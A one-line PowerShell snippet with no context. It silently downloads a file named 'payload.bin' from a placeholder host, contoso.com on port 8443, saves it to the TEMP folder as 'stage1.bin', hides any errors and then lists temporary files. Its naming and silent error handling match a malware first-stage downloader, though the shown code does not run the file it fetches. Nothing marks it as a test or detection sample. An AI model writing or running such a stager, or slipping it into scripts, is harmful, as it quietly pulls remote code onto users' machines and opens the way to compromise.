
try { $TransferUrl = 'https://contoso.com:8443/payload.bin'; $LocalPath = "$env:TEMP\stage1.bin"; Invoke-WebRequest -Uri $TransferUrl -OutFile $LocalPath -UseBasicParsing -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Set-Location -Path $env:TEMP } catch { Write-Warning "Remote fetch failed" }
